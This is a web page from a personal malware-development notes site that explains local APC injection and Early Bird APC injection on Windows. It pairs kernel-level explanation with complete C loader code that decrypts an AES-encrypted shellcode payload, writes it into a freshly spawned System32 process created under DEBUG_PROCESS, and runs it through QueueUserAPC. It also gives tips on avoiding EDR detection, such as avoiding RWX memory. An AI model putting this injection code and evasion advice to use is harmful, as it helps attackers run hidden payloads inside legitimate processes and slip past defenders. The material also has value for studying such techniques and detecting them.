# https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection

For the complete documentation index, see [llms.txt](https://www.udayxd.xyz/llms.txt). This page is also available as [Markdown](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection.md).

## APC Injection and Early Bird APC Injection[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#apc-injection-and-early-bird-apc-injection)

### What is an APC[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#what-is-an-apc)

An Asynchronous Procedure Call is basically a function that gets queued to a specific thread and executed by the kernel when that thread enters an alertable wait. Every thread has two APC queues stored in its `_KTHREAD` structure, one for kernel-mode APCs and one for user-mode APCs.

Copy

```
_KTHREAD
  +0x050 ApcState : _KAPC_STATE
    +0x000 ApcListHead : [2] _LIST_ENTRY   // [0] = kernel APCs, [1] = user APCs
    +0x020 UserApcPending : UChar           // flag: a user APC is waiting
```

`QueueUserAPC` appends your function to `ApcListHead[1]`. When the thread enters an alertable wait, the kernel checks `UserApcPending` and if it is set, dispatches the function.

* * *

### Alertable State[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#alertable-state)

Not every thread can run a queued APC. Only threads in an alertable state can. A thread gets into alertable state by calling one of these with the alertable parameter set to `TRUE`:

Copy

```
SleepEx(INFINITE, TRUE);
WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
MsgWaitForMultipleObjectsEx(1, &hEvent, INFINITE, QS_KEY, MWMO_ALERTABLE);
SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
```

#### What actually happens at the kernel level[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#what-actually-happens-at-the-kernel-level)

Taking `SleepEx(INFINITE, TRUE)` as the example:

Copy

```
SleepEx(INFINITE, TRUE)
  -> NtDelayExecution(TRUE, &interval)   syscall
    -> KeDelayExecutionThread(KernelMode, TRUE, &interval)
      -> _KTHREAD.Alertable = 1          written directly into the thread object
      -> thread enters wait state
```

That `TRUE` you pass is not just some flag that lives in user mode. It travels down through the syscall and gets written into `_KTHREAD.Alertable`. The scheduler now knows this thread can be woken up by a user APC. If you pass `FALSE` instead, the thread sleeps the same way but `Alertable = 0` and no APC will ever fire on it even if you queue one.

#### The dummy event[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#the-dummy-event)

Some of these functions need a handle to wait on, but the handle itself does not matter at all. You just create a dummy event to satisfy the parameter:

Copy

```
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
```

The event never gets signaled so the thread blocks on it forever, which is exactly what you want. A thread just sitting there in alertable state, ready to pick up your APC. `SleepEx(INFINITE, TRUE)` is even simpler since you do not need the event at all.

* * *

### QueueUserAPC[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#queueuserapc)

Copy

```
DWORD QueueUserAPC(
  PAPCFUNC  pfnAPC,    // address of your shellcode
  HANDLE    hThread,   // handle to target thread, needs THREAD_SET_CONTEXT
  ULONG_PTR dwData     // argument passed to the function, NULL for shellcode
);
```

#### What happens at the kernel level[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#what-happens-at-the-kernel-level)

Copy

```
QueueUserAPC(shellcodeAddr, hThread, 0)
  -> NtQueueApcThread  syscall
    -> KeInsertQueueApc
      -> allocates a _KAPC structure
      -> sets _KAPC.NormalRoutine = shellcodeAddr
      -> appends it to _KTHREAD.ApcState.ApcListHead[1]
      -> sets _KTHREAD.ApcState.UserApcPending = 1
      -> checks: _KTHREAD.Alertable == 1?
          YES -> wakes the thread early, wait returns STATUS_USER_APC
          NO  -> APC just sits pending in the queue
```

When the alertable thread wakes up with `STATUS_USER_APC`, the kernel dispatches every pending APC on `ApcListHead[1]` before the thread goes back to normal execution. Your shellcode runs inside that thread's context.

* * *

## Local APC Injection[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#local-apc-injection)

In local APC injection you control everything. You create a sacrificial thread in your own process, park it in alertable state, allocate shellcode locally, then queue the APC on it.

### Logic[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#logic)

- Create a thread running SleepEx(INFINITE, TRUE) so it parks in alertable state

- Decrypt shellcode

- VirtualAlloc locally with RW

- memcpy shellcode in

- VirtualProtect to RX

- QueueUserAPC(shellcodeAddr, hThread, NULL)
kernel sees Alertable = 1 and fires it immediately

- WaitForSingleObject(hThread, INFINITE)


### Implementation[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#implementation)

Copy

```
BOOL RUnVIaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayLoadSize) {

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pKey, pIv);
    PVOID pAddress        = NULL;
    DWORD dwOldProtection = NULL;

    // decrypt CipherText in-place before copying
    AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));

    pAddress = VirtualAlloc(NULL, sPayLoadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayLoadSize);

    if (!VirtualProtect(pAddress, sPayLoadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        printf("[!] QueueUserAPC Failed: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

DWORD WINAPI DummyFunction(LPVOID lpParam) {
    SleepEx(INFINITE, TRUE);
    return 0;
}

int main() {
    HANDLE hThread = CreateThread(NULL, NULL, DummyFunction, NULL, 0, NULL);

    getchar();

    if (!RUnVIaApcInjection(hThread, CipherText, sizeof(CipherText))) {
        printf("[!] Failed: %d\n", GetLastError());
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

### Code Walkthrough[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#code-walkthrough)

Copy

```
HANDLE hThread = CreateThread(NULL, NULL, DummyFunction, NULL, 0, NULL);
```

Creates a thread that runs `DummyFunction`. That function immediately calls `SleepEx(INFINITE, TRUE)` which writes `_KTHREAD.Alertable = 1` and parks the thread in a wait state. This is your APC target.

Copy

```
AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
```

Decrypts `CipherText` in-place in your own process memory. Since `pPayload` is just a pointer to `CipherText`, after this line `pPayload` already points to the decrypted bytes. The decryption has to happen before `memcpy`, otherwise you copy encrypted garbage into the allocation.

Copy

```
pAddress = VirtualAlloc(NULL, sPayLoadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

Local allocation in your own process. The kernel creates a VAD node with `PAGE_READWRITE`, sets up demand-zero PTEs. The returned address is valid in your process and you can dereference it directly.

Copy

```
memcpy(pAddress, pPayload, sPayLoadSize);
```

`memcpy` is correct here because `pAddress` is a local allocation. This is the key difference from cross-process injection where you would need `WriteProcessMemory`. Local allocation means `memcpy`. Remote allocation means `WriteProcessMemory`.

Copy

```
VirtualProtect(pAddress, sPayLoadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
```

Flips the VAD node protection. `PAGE_EXECUTE_READWRITE` works but it is a strong EDR signal since a region that is writable and executable at the same time looks very suspicious. Since you are done writing at this point, `PAGE_EXECUTE_READ` is the cleaner choice.

Copy

```
QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
```

`KeInsertQueueApc` appends the APC to `hThread`'s `ApcListHead[1]` and sets `UserApcPending = 1`. Because `DummyFunction` already put the thread into alertable state (`Alertable = 1`), the kernel wakes the thread immediately and the shellcode fires.

Copy

```
WaitForSingleObject(hThread, INFINITE);
```

Blocks main until the shellcode thread finishes. If your shellcode is a beacon or reverse shell it will never return, so main just blocks forever which is fine.

* * *

## Early Bird APC Injection[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#early-bird-apc-injection)

In the previous part `QueueUserAPC` was used to execute a payload locally. Here the same API is used to execute a payload in a remote process. The difference is that the target thread is not running yet when the APC is queued. You are injecting before the process is alive.

### The Core Idea[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#the-core-idea)

You create a process in a frozen state before its main thread starts executing. Queue your APC on the main thread. Release the process. During ntdll initialization, before the process even reaches its own entry point, the loader internally hits an alertable wait. The APC fires there, inside the target process, before any of the target's own code runs.

This is why it is called Early Bird. You get in before the process is awake.

* * *

### CREATE\_SUSPENDED and ResumeThread[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#create_suspended-and-resumethread)

The simple and clean approach.

#### Logic[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#logic-1)

- CreateProcess with CREATE\_SUSPENDED, main thread is frozen, you get the PID and hThread

- VirtualAllocEx in the target with RW

- Decrypt shellcode locally

- WriteProcessMemory to put the shellcode in the target

- VirtualProtectEx to flip to RX

- QueueUserAPC(shellcodeAddr, hThread), APC sits pending since thread is not alertable yet

- ResumeThread(hThread), thread starts, hits alertable wait in ntdll loader, APC fires


#### Code[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#code)

Copy

```
CreateProcessA(NULL, lpPath, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL, &Si, &Pi);

// VirtualAllocEx, WriteProcessMemory, VirtualProtectEx ...

QueueUserAPC((PAPCFUNC)pAddress, Pi.hThread, NULL);
ResumeThread(Pi.hThread);
```

* * *

### DEBUG\_PROCESS and DebugActiveProcessStop[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#debug_process-and-debugactiveprocessstop)

A slightly different mechanism, same result.

#### What DEBUG\_PROCESS actually does[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#what-debug_process-actually-does)

When you create a process with `DEBUG_PROCESS`, your process becomes its debugger. The kernel places a breakpoint at the target's entry point and freezes it there, then fires `CREATE_PROCESS_DEBUG_EVENT` to notify you. The target sits paused waiting for the debugger to tell it to continue.

You inject during that pause, then call `DebugActiveProcessStop` to detach. Detaching releases the target and it resumes execution. The APC fires during ntdll init the same way as before.

#### Logic[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#logic-2)

- CreateProcess with DEBUG\_PROCESS, your process is now the debugger

- VirtualAllocEx in the target with RW

- Decrypt shellcode locally

- WriteProcessMemory to put shellcode in the target

- VirtualProtectEx to flip to RX

- QueueUserAPC(shellcodeAddr, hThread), APC queued but thread still paused

- DebugActiveProcessStop(dwProcessId), detach, target resumes, APC fires


#### CREATE\_SUSPENDED vs DEBUG\_PROCESS[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#create_suspended-vs-debug_process)

CREATE\_SUSPENDED

DEBUG\_PROCESS

How you release it

ResumeThread

DebugActiveProcessStop

Debug events

None

Kernel fires CREATE\_PROCESS\_DEBUG\_EVENT immediately

Complexity

Simple

You are now a debugger, more moving parts

EDR visibility

Common and expected

Unusual for non-debugger processes

`CREATE_SUSPENDED` is simpler and more predictable. `DEBUG_PROCESS` gives you extra control but the debug event handling adds complexity and is more likely to get flagged.

One important thing to know about both: suspending an already running thread with `SuspendThread` does NOT work for APC injection. The thread has to be created suspended from the start. A mid-run suspended thread does not enter the alertable dispatch path when you resume it.

* * *

### Implementation (DEBUG\_PROCESS variant)[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#implementation-debug_process-variant)

Copy

```
BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId,
                              HANDLE* hProcess, HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    Si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH))
        return FALSE;

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE,
        DEBUG_PROCESS, NULL, NULL, &Si, &Pi))
        return FALSE;

    *dwProcessId = Pi.dwProcessId;
    *hProcess    = Pi.hProcess;
    *hThread     = Pi.hThread;

    return (*dwProcessId && *hProcess && *hThread);
}

int main(int argc, char* argv[]) {

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pKey, pIv);

    HANDLE hProcess        = NULL;
    DWORD  dwProcessId     = 0;
    HANDLE hThread         = NULL;
    LPVOID pAddress        = NULL;
    DWORD  dwOldProtection = NULL;
    SIZE_T bytesWritten    = 0;

    if (!CreateSuspendedProcess2(argv[1], &dwProcessId, &hProcess, &hThread))
        return -1;

    pAddress = VirtualAllocEx(hProcess, NULL, sizeof(CipherText),
                              MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (pAddress == NULL)
        return FALSE;

    AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));

    if (!WriteProcessMemory(hProcess, pAddress, CipherText, sizeof(CipherText), &bytesWritten))
        return FALSE;

    if (!VirtualProtectEx(hProcess, pAddress, sizeof(CipherText),
                          PAGE_EXECUTE_READ, &dwOldProtection))
        return FALSE;

    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL))
        return FALSE;

    if (!DebugActiveProcessStop(dwProcessId))
        return FALSE;

    return 0;
}
```

### Code Walkthrough[Direct link to heading](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection\#code-walkthrough-1)

Copy

```
CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi);
```

Creates the target with `DEBUG_PROCESS`. Your process becomes the debugger. The kernel fires `CREATE_PROCESS_DEBUG_EVENT` and the target's main thread is frozen at its entry point. `Pi.hThread` is a handle to that main thread. `Pi.dwProcessId` is the PID you will need later for `DebugActiveProcessStop`.

Copy

```
pAddress = VirtualAllocEx(hProcess, NULL, sizeof(CipherText),
                          MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
```

Allocates inside the target process. The kernel checks `PROCESS_VM_OPERATION` on `hProcess`, attaches to the target's address space, and creates a VAD node in the target's VAD tree. `pAddress` is only valid inside `hProcess`. Trying to dereference it in your own process makes no sense.

Copy

```
AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
```

Decrypts in your own process memory. Has to happen before the write.

Copy

```
WriteProcessMemory(hProcess, pAddress, CipherText, sizeof(CipherText), &bytesWritten);
```

This is what crosses the process boundary. The kernel switches to the target's page tables, resolves `pAddress` to physical RAM, faults in demand-zero pages if needed, then copies bytes from `CipherText` in your process into those physical pages. After this call the shellcode bytes actually live inside the target at `pAddress`.

Copy

```
VirtualProtectEx(hProcess, pAddress, sizeof(CipherText), PAGE_EXECUTE_READ, &dwOldProtection);
```

Flips the protection in the target's VAD tree from `PAGE_READWRITE` to `PAGE_EXECUTE_READ`. Always RW then RX. Never allocate RWX directly, that is a very loud signal to EDRs scanning VAD regions.

Copy

```
QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);
```

Queues the APC on the target's main thread. `KeInsertQueueApc` appends to `ApcListHead[1]` and sets `UserApcPending = 1`. The thread is still frozen so the APC just sits pending and does not fire yet.

Copy

```
DebugActiveProcessStop(dwProcessId);
```

Detaches the debugger. The target is released and starts running. Its main thread goes through ntdll initialization. During that init the loader internally hits an alertable wait. The kernel sees `UserApcPending = 1`, `Alertable = 1`, dispatches the APC, and your shellcode runs inside the target's main thread before the target's own entry point is ever reached.

[PreviousProcess Enumeration with NtAPI](https://www.udayxd.xyz/notes/maldev/process-enumeration-with-ntapi) [NextThread Hijacking Local Thread Creation](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation)

Last updated 29 days ago